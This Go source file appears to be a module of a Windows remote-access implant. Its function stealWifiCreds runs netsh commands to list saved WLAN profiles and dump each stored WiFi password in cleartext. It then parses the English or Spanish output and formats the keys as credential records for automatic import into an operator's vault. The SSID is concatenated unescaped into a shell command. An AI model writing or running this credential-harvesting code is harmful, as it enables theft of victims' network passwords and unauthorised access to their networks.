//go:build windows

package agent

import (
	"strings"
)

// stealWifiCreds extracts saved WiFi passwords via netsh wlan.
// Returns results in BrowserCred format for auto-import to vault.
func stealWifiCreds() ([]BrowserCred, error) {
	// List all saved WLAN profiles
	out, err := runShell("netsh wlan show profiles")
	if err != nil {
		return nil, err
	}

	ssids := parseWlanProfiles(out)
	if len(ssids) == 0 {
		return nil, nil
	}

	var creds []BrowserCred
	for _, ssid := range ssids {
		detail, err := runShell(`netsh wlan show profile name="` + ssid + `" key=clear`)
		if err != nil {
			continue
		}
		key := parseWlanKey(detail)
		if key == "" {
			continue
		}
		creds = append(creds, BrowserCred{
			Source:   "WiFi",
			Target:   ssid,
			Username: ssid,
			Password: key,
		})
	}
	return creds, nil
}

// parseWlanProfiles parses "netsh wlan show profiles" output and returns SSID names.
// Handles both English ("All User Profile") and Spanish ("Perfil de todos los usuarios").
func parseWlanProfiles(out string) []string {
	var ssids []string
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		// Both EN and ES output have a colon-separated format
		idx := strings.LastIndex(line, ":")
		if idx < 0 {
			continue
		}
		left := strings.ToLower(strings.TrimSpace(line[:idx]))
		if strings.Contains(left, "profile") || strings.Contains(left, "perfil") {
			ssid := strings.TrimSpace(line[idx+1:])
			if ssid != "" {
				ssids = append(ssids, ssid)
			}
		}
	}
	return ssids
}

// parseWlanKey extracts the cleartext WiFi key from "netsh wlan show profile ... key=clear".
func parseWlanKey(out string) string {
	for _, line := range strings.Split(out, "\n") {
		lower := strings.ToLower(line)
		// EN: "Key Content", ES: "Contenido de la clave"
		if strings.Contains(lower, "key content") || strings.Contains(lower, "contenido de la clave") {
			idx := strings.LastIndex(line, ":")
			if idx >= 0 {
				return strings.TrimSpace(line[idx+1:])
			}
		}
	}
	return ""
}
